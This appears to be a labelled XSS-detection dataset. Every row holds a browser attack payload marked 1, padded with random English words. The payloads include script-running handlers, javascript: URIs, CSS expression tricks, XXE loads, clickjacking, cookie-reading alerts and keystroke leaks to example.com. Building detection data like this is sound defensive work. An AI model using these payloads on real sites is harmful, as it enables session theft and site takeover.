payload	xss
underleasing <div id="29"&gt<link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`--&gt]]&gt]</div&gt<div id="30"&gt<style&gt@import "data:,*%7bx:expression(alert(30))%7D";</style&gt//["'`--&gt]]&gt]</div&gt<div id="31"&gt<frameset onload=alert(31)&gt//["'`--&gt]]&gt]</div&gt<div id="32"&gt<table background="javascript:alert(32)"&gt</table&gt//["'`--&gt]]&gt]</div&gt<div id="33"&gt<a style="pointer-events:none;position:absolute;"&gt<a style="position:absolute;" onclick="alert(33);"&gtXXX</a&gt</a&gt<a href="javascript:alert(2)"&gtXXX</a&gt//["'`--&gt]]&gt]</div&gt<div id="34"&gt1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss&gt</vmlframe&gt//["'`--&gt]]&gt]</div&gt<div id="35"&gt1<a href=#&gt<line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt</a&gt//["'`--&gt]]&gt]</div&gt<div id="36"&gt<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)"&gtXXX</a&gt//["'`--&gt]]&gt]</div&gt<div id="37"&gt<!--<img src="--&gt<img src=x onerror=alert(37)//"&gt//["'`--&gt]]&gt]</div&gt<div id="38"&gt<comment&gt<img src="</comment&gt<img src=x onerror=alert(38)//"&gt//["'`--&gt]]&gt]</div&gt	1
Aguijan <div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->	1
Syzran &lt![>&ltimg src=&quot]>&ltimg src=x onerror=alert(39)//&quot>	1
platinichloric &lt!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  --> misdrives	1
Maycock &ltsvg>&lt![CDATA[>&ltimage xlink:href="]]>&ltimg src=xx:x onerror=alert(2)//">&lt/svg>//["'`-->]]>]&lt/div>	1
Balija &ltdiv id="40">&ltstyle>&ltimg src="&lt/style>&ltimg src=x onerror=alert(40)//">//["'`-->]]>]&lt/div> Abercrombie	1
Chevy &ltdiv id="41">&ltli style=list-style:url() onerror=alert(41)>&lt/li> Urocoptidae	1
precoded <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[&quot&quot`-->]]>]</div> neurohypnology	1
etherified <div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div> recomember	1
<div id="43"><?xml version="1.0" standalone="no"?>	1
adventitiousness <html xmlns="http://www.w3.org/1999/xhtml"> single-headed	1
unmysticising &lthead>&ltstyle type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}&lt/style>&lt/head> substantive	1
world-swallowing <body>Hello</body> overreaches	1
purlin </html&gt//["'`--&gt]]&gt]</div&gt	1
slitless <div id="44"><style>*[{}@import&quottest.css?]{color: green;}</style>X//["&quot`-->]]>]</div><div id="45"><div style="font-family:&quotfoo[a];color:red;&quot;">XXX</div>//["&quot`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["&quot`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["&quot`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["&quot`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["&quot`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["&quot`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["&quot`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["&quot`-->]]>]</div>	1
clote &ltdiv id="53"&gt&ltxml id="xss" src="test.htc"&gt&lt/xml&gt roughroot	1
<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["&quot`-->]]>]</div>	1
nonschooling <div id=&quot54&quot><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[&quot'`-->]]>]</div><div id=&quot55&quot><video><source onerror=&quotalert(55)&quot>//[&quot'`-->]]>]</div><div id=&quot56&quot><video onerror=&quotalert(56)&quot><source></source></video>//[&quot'`-->]]>]</div><div id=&quot57&quot><b <script>alert(57)//</script>0</script></b>//[&quot'`-->]]>]</div><div id=&quot58&quot><b><script<b></b><alert(58)</script </b></b>//[&quot'`-->]]>]</div><div id=&quot59&quot><div id=&quotdiv1&quot><input value=&quot``onmouseover=alert(59)&quot></div> <div id=&quotdiv2&quot></div><script>document.getElementById(&quotdiv2&quot).innerHTML = document.getElementById(&quotdiv1&quot).innerHTML;</script>//[&quot'`-->]]>]</div><div id=&quot60&quot><div style=&quot[a]color[b]:[c]red&quot>XXX</div>//[&quot'`-->]]>]</div> autor	1
nonlinearly <div id=&quot61&quot&gt<div  style=&quot\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;&quot&gtXXX</div&gt//[&quot'`--&gt]]&gt]</div&gt radio-active	1
&ltdiv id="62">&lt!-- IE 6-8 -->	1
Dory <x '=&quotfoo&quot><x foo='><img src=x onerror=alert(62)//'> Rutaceae	1
crows &lt!-- IE 6-9 -->	1
inter-Allied <! '="foo"><x foo='><img src=x onerror=alert(2)//'> poundmeal	1
meiocene &lt? '="foo">&ltx foo='>&ltimg src=x onerror=alert(3)//'>//["'`-->]]>]&lt/div> irascibleness	1
transmuter <div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF	1
prebenefiting <img src="javascript:alert(2)"> phytopharmacologic	1
monsieurship <image src=&quotjavascript:alert(2)&quot> // IE6, O10.10↓, OM10.0↓	1
&ltscript src="javascript:alert(3)"&gt&lt/script&gt // IE6, O11.01↓, OM10.1↓//["'`--&gt]]&gt]&lt/div&gt	1
reconfuse <div id="64"&gt<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe"&gt]&gt<y&gt&x;</y&gt//["'`--&gt]]&gt]</div&gt<div id="65"&gt<svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"&gt</svg&gt//["'`--&gt]]&gt]</div&gt Southworth	1
canvassing <div id=&quot66&quot&gt<?xml version=&quot1.0&quot?&gt sneaked	1
&lt?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?&gt	1
sodawater <root/>//["'`-->]]>]</div>	1
sparkingly <div id="67"><!DOCTYPE x [   <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x"onerror CDATA "alert(67)"onload CDATA "alert(2)">]><img />//["&quot`-->]]>]</div>	1
tonguesore <div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">   <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x></doc>//["'`-->]]>]</div>	1
expressibly &ltdiv id=&quot69&quot>&ltcard xmlns=&quothttp://www.wapforum.org/2001/wml&quot>&ltonevent type=&quotontimer&quot>&ltgo href=&quotjavascript:alert(69)&quot/>&lt/onevent>&lttimer value=&quot1&quot/>&lt/card>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot70&quot>&ltdiv style=width:1px;filter:glow onfilterchange=alert(70)>x&lt/div>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot71&quot>&lt// style=x:expression\28alert(71)\29>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot72&quot>&ltform>&ltbutton formaction=&quotjavascript:alert(72)&quot>X&lt/button>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot73&quot>&ltevent-source src=&quotevent.php&quot onload=&quotalert(73)&quot>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot74&quot>&lta href=&quotjavascript:alert(74)&quot>&ltevent-source src=&quotdata:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A&quot />&lt/a>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot75&quot>&ltscript&lt{alert(75)}/>&lt/script &lt/>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot76&quot>&lt?xml-stylesheet type=&quottext/css&quot?>&lt!DOCTYPE x SYSTEM &quottest.dtd&quot>&ltx>&x;&lt/x>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot77&quot>&lt?xml-stylesheet type=&quottext/css&quot?>&ltroot style=&quotx:expression(alert(77))&quot/>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot78&quot>&lt?xml-stylesheet type=&quottext/xsl&quot href=&quot#&quot?>&ltimg xmlns=&quotx-schema:test.xdr&quot/>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot79&quot>&ltobject allowscriptaccess=&quotalways&quot data=&quottest.swf&quot>&lt/object>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot80&quot>&ltstyle>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}&lt/style>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot81&quot>&ltx xmlns:xlink=&quothttp://www.w3.org/1999/xlink&quot xlink:actuate=&quotonLoad&quot xlink:href=&quotjavascript:alert(81)&quot xlink:type=&quotsimple&quot/>//[&quot'`-->]]>]&lt/div>&ltdiv id=&quot82&quot>&lt?xml-stylesheet type=&quottext/css&quot href=&quotdata:,*%7bx:expression(write(2));%7d&quot?>//[&quot'`-->]]>]&lt/div> crispate	1
&ltdiv id="83">&ltx:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)">&ltx:timer value="1"/>&lt/x:template>//["'`-->]]>]&lt/div>	1
tinpot &ltdiv id="84">&ltx xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["&quot`-->]]>]&lt/div>&ltdiv id="85">&ltx xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["&quot`-->]]>]&lt/div>&ltdiv id="86">&ltbody oninput=alert(86)>&ltinput autofocus>//["&quot`-->]]>]&lt/div>	1
<div id=&quot87&quot><svg xmlns=&quothttp://www.w3.org/2000/svg&quot>	1
&lta xmlns:xlink=&quothttp://www.w3.org/1999/xlink&quot xlink:href=&quotjavascript:alert(87)&quot>&ltrect width=&quot1000&quot height=&quot1000&quot fill=&quotwhite&quot/>&lt/a>	1
subumbilical </svg>//["&quot`-->]]>]</div> drought	1
&ltdiv id="88"&gt&ltsvg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt	1
draggle-tail <animation xlink:href="javascript:alert(88)"/> Glendower	1
coituses <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>	1
mumpers <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"/>	1
traducianistic <foreignObject xlink:href="javascript:alert(88)"/&gt	1
munited <foreignObject xlink:href=&quotdata:text/xml,%3Cscript xmlns=&quothttp://www.w3.org/1999/xhtml&quot%3Ealert(88)%3C/script%3E&quot/&gt obsidious	1
nondichogamous &lt/svg&gt//["'`--&gt]]&gt]&lt/div&gt	1
unpunishedness <div id="89"&gt<svg xmlns="http://www.w3.org/2000/svg"&gt	1
hizzie <set attributeName="onmouseover" to="alert(89)"/>	1
howk <animate attributeName="onunload" to="alert(89)"/&gt	1
&lt/svg>//["'`-->]]>]&lt/div>	1
Trans-antarctic &ltdiv id="90"&gt&lt!-- Up to Opera 10.63 --&gt	1
meteorogram <div style=content:url(test2.svg)></div> infraposing	1
hackwork <!-- Up to Opera 11.64 - see link below --> crenation	1
velarium &lt!-- Up to Opera 12.x --> humanizations	1
<div style="background:url(test5.svg)">PRESS ENTER</div>//["&quot`-->]]>]</div>	1
Islamitish &ltdiv id="91"&gt[A]	1
neurochorioretinitis <? foo="><script>alert(91)</script>"> Pro-american	1
karyomitotic <! foo=&quot><script>alert(91)</script>&quot> superseamen	1
granuloma &lt/ foo=">&ltscript>alert(91)&lt/script>"> obturated	1
handtrap <? foo="><x foo=&quot?><script>alert(91)</script>&quot>">	1
cavort &lt! foo=&quot[[[x]]&quot>&ltx foo=&quot]foo>&ltscript>alert(91)&lt/script>&quot> overservileness	1
liquefactions <% foo><x foo="%><script>alert(91)</script>">//["&quot`-->]]>]</div>	1
fumishing <div id=&quot92&quot><div style=&quotbackground:url(http://foo.f/f oo/;color:red/*/foo.jpg);&quot>X</div>//[&quot'`-->]]>]</div><div id=&quot93&quot><div style=&quotlist-style:url(http://foo.f)\20url(javascript:alert(93));&quot>X</div>//[&quot'`-->]]>]</div>	1
&ltdiv id="94">&ltsvg xmlns="http://www.w3.org/2000/svg">	1
indestructible <handler xmlns:ev=&quothttp://www.w3.org/2001/xml-events&quot ev:event=&quotload&quot&gtalert(94)</handler&gt	1
portglave </svg&gt//["'`--&gt]]&gt]</div&gt ungrand	1
brow&quots <div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">	1
<feImage&gt<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/&gt</feImage&gt	1
audivision &lt/svg&gt//["'`--&gt]]&gt]&lt/div&gt	1
unsoftness <div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe> off-break	1
nonconnectivity <iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div> foregoers	1
<div id="97"&gt<!-- IE 5-9 --&gt	1
&ltdiv id=d>&ltx xmlns=&quot>&ltiframe onload=alert(97)&quot>&lt/div>	1
kachina <script>d.innerHTML+='';</script>	1
freezed &lt!-- IE 10 in IE5-9 Standards mode --> ramosopinnate	1
sulfocarbamide <div id=d><x xmlns=&quot"><iframe onload=alert(2)//&quot></div>	1
<script>d.innerHTML+='';</script>//[&quot'`-->]]>]</div>	1
obscenest <div id="98"&gt<div id=d&gt<div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"&gtX</div&gt</div&gt	1
Pelomedusa <script&gtwith(document.getElementById(&quotd&quot))innerHTML=innerHTML</script&gt//[&quot'`--&gt]]&gt]</div&gt	1
immobilize &ltdiv id="99"&gtXXX&ltstyle&gt	1
discorporate *{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */ outbook	1
&lt!--	1
microoperations --><!--*{color:red}   /* all UA */	1
tortility *{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */ unshaken	1
nondefiantness </style&gt//[&quot'`--&gt]]&gt]</div&gt	1
&ltdiv id="100">&ltimg[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'`-->]]>]&lt/div>&ltdiv id="101">&lta href="[a]java[b]script[c]:alert(101)">XXX&lt/a>//["'`-->]]>]&lt/div>&ltdiv id="102">&ltimg src="x` `&ltscript>alert(102)&lt/script>"` `>//["'`-->]]>]&lt/div>&ltdiv id="103">&ltscript>history.pushState(0,0,'/i/am/somewhere_else');&lt/script>//["'`-->]]>]&lt/div>	1
sincerest <div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">	1
<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/&gt	1
&lt/svg>//["'`-->]]>]&lt/div>	1
tenzon <div id=&quot105&quot><iframe src=&quotdata:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03&quot></iframe>//[&quot'`-->]]>]</div><div id=&quot106&quot><img src onerror /&quot '&quot= alt=alert(106)//&quot>//[&quot'`-->]]>]</div><div id=&quot107&quot><title onpropertychange=alert(107)></title><title title=></title>//[&quot'`-->]]>]</div> coinventor	1
<div id="108"&gt<!-- IE 5-8 standards mode --&gt	1
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(108)></a>">	1
prealphabetical <!-- IE 5-9 standards mode --&gt	1
salmonellae <!a foo=x=`y&gt<img alt="`&gt<img src=xx:x onerror=alert(2)//"&gt uplock	1
Rombert <?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//">//["'`-->]]>]</div>	1
&ltdiv id="109">&ltsvg xmlns="http://www.w3.org/2000/svg">	1
<a id="x"&gt<rect fill="white" width="1000" height="1000"/&gt</a&gt	1
apostatise <rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/&gt	1
rosy-faced </svg>//["'`-->]]>]</div>	1
moolings <div id="110"><svg xmlns="http://www.w3.org/2000/svg">	1
brogueful <path d=&quotM0,0&quot style=&quotmarker-start:url(test4.svg#a)&quot/> pulpitful	1
fasciculated &lt/svg>//["'`-->]]>]&lt/div>	1
yuckel <div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>	1
<div id="113"&gt<div id="x"&gtXXX</div&gt	1
propends <style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//["'`-->]]>]</div> callidness	1
<div id="114"&gt<x style="background:url('x[a];color:red;/*')"&gtXXX</x&gt//["'`--&gt]]&gt]</div&gt	1
chechakos <div id="115"&gt<!--[if]&gt<script&gtalert(115)</script --&gt	1
antipragmaticism <!--[if<img src=x onerror=alert(2)//]> -->//["&quot`-->]]>]</div>	1
chimps <div id="116"><div id="x">x</div> saprobic	1
traumaticin <xml:namespace prefix=&quott&quot&gt	1
fanciful <import namespace=&quott&quot implementation=&quot#default#time2&quot> scissor-fashion	1
Anchisaurus <t:set attributeName=&quotinnerHTML&quot targetElement=&quotx&quot to=&quot&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;&quot&gt//[&quot'`--&gt]]&gt]</div&gt dartling	1
annexion <div id=&quot117&quot&gt<a href=&quothttp://attacker.org&quot&gt	1
&ltiframe src=&quothttp://example.org/&quot>&lt/iframe>	1
peramble &lt/a>//[&quot'`-->]]>]&lt/div>	1
Havener <div id="118"&gt<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"&gt<h1&gtDrop me</h1&gt</div&gt	1
<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>	1
diamantine <div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe> unsomber	1
malleiferous <textarea type="text" cols="50" rows="10"></textarea>//["&quot`-->]]>]</div> slocker	1
iolite <div id="120"><script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script> Ike	1
vestlike <body&gt<a href=&quot#&quot onclick=&quotmakePopups()&quot&gtSpam</a&gt//[&quot'`--&gt]]&gt]</div&gt	1
Chebanse &ltdiv id="121">&lthtml xmlns="http://www.w3.org/1999/xhtml"	1
beryllium xmlns:svg="http://www.w3.org/2000/svg">	1
flaneur <body style="background:gray"&gt	1
distinctional <iframe src=&quothttp://example.com/&quot style=&quotwidth:800px; height:350px; border:none; mask: url(#maskForClickjacking);&quot/&gt	1
corrections <svg:svg&gt<svg:mask id=&quotmaskForClickjacking&quot maskUnits=&quotobjectBoundingBox&quot maskContentUnits=&quotobjectBoundingBox&quot&gt<svg:rect x=&quot0.0&quot y=&quot0.0&quot width=&quot0.373&quot height=&quot0.3&quot fill=&quotwhite&quot/&gt<svg:circle cx=&quot0.45&quot cy=&quot0.7&quot r=&quot0.075&quot fill=&quotwhite&quot/&gt</svg:mask&gt</svg:svg&gt</body&gt unbesmutted	1
</html>//[&quot'`-->]]>]</div>	1
<div id=&quot122&quot><iframe sandbox=&quotallow-same-origin allow-forms allow-scripts&quot src=&quothttp://example.org/&quot></iframe>//[&quot'`-->]]>]</div>	1
janitrix &ltdiv id="123">&ltspan class=foo>Some text&lt/span> flavoring	1
imbrue <a class=bar href=&quothttp://www.example.org&quot>www.example.org</a>	1
unavouchable <script src="http://code.jquery.com/jquery-1.4.4.js"></script> rock-enthroned	1
<script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>//["'`-->]]>]</div>	1
<div id="124"&gt<script src="/\example.com\foo.js"&gt</script&gt // Safari 5.0, Chrome 9, 10	1
<script src=&quot\\example.com\foo.js&quot></script> // Safari 5.0//[&quot'`-->]]>]</div>	1
repatent &ltdiv id="125">&lt?xml version="1.0"?>	1
<?xml-stylesheet type="text/xml" href="#stylesheet"?>	1
Sandhurst <!DOCTYPE doc [	1
nongovernment <!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>	1
&ltsvg xmlns=&quothttp://www.w3.org/2000/svg&quot>	1
<xsl:stylesheet id=&quotstylesheet&quot version=&quot1.0&quot xmlns:xsl=&quothttp://www.w3.org/1999/XSL/Transform&quot>        <xsl:template match=&quot/&quot><iframe xmlns=&quothttp://www.w3.org/1999/xhtml&quot src=&quotjavascript:alert(125)&quot></iframe>        </xsl:template></xsl:stylesheet><circle fill=&quotred&quot r=&quot40&quot></circle></svg>//[&quot'`-->]]>]</div>	1
<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>	1
<object classid=&quotclsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&quot onqt_error=&quotalert(126)&quot style=&quotbehavior:url(#x);&quot&gt<param name=postdomevents /&gt</object&gt//[&quot'`--&gt]]&gt]</div&gt	1
piggin <div id="127"&gt<svg xmlns="http://www.w3.org/2000/svg" id="x"&gt	1
interjectiveness <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/> Odontophorinae	1
Sadieville &lthandler id="y">alert(127)&lt/handler> chemigraph	1
uninvestigating &lt/svg>//["'`-->]]>]&lt/div>	1
chandlerly <div id="128"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//["&quot`-->]]>]</div> gunsels	1
galaxy's <div id="129"&gt<svg&gt servoing	1
Guinna &ltimage style=&quotfilter:url("data:image/svg+xml,&ltsvg xmlns=%22http://www.w3.org/2000/svg%22>&ltscript>parent.alert(129)&lt/script>&lt/svg>")&quot>	1
</svg>//["'`-->]]>]</div>	1
unreservedness <div id="130"&gt<math href="javascript:alert(130)"&gtCLICKME</math&gt romerillo	1
<math>	1
limbecks &ltmaction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME&lt/maction> unseducible	1
electrotyping &ltmaction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME&ltmtext>http://http://google.com&lt/mtext>&lt/maction> assessments	1
</math>//[&quot'`-->]]>]</div>	1
poppy-crimson &ltdiv id="131">&ltb>drag and drop one of the following strings to the drop box:&lt/b>	1
<br/><hr/>jAvascript:alert(&quotTop Page Location: &quot+document.location+&quot Host Page Cookies: &quot+document.cookie);//<br/><hr/>	1
baryton feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//&ltbr/>&lthr/>	1
feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>	1
obumbrated <br/&gt<hr/&gtfeed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/&gt<hr/&gt	1
hippotomy <div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["&quot`-->]]>]</div>	1
surf-beaten <div id="132"><!doctype html> deciding	1
siecles &ltform>	1
unwwoven &ltlabel>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)&lt/label> Edgewater	1
oases <br> agene	1
daybreak <input name=&quotsecret&quot type=&quotpassword&quot>	1
</form>	1
&lt!-- injection -->&ltsvg height="50px">	1
conjunctiva <image xmlns:xlink="http://www.w3.org/1999/xlink">	1
sea-faring <set attributeName=&quotxlink:href&quot begin=&quotaccessKey(a)&quot to=&quot//example.com/?a&quot /> Judaeomancy	1
designator <set attributeName=&quotxlink:href&quot begin=&quotaccessKey(b)&quot to=&quot//example.com/?b&quot />	1
cornhusking <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /&gt Limpopo	1
flat-fronted <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /> scrummaging	1
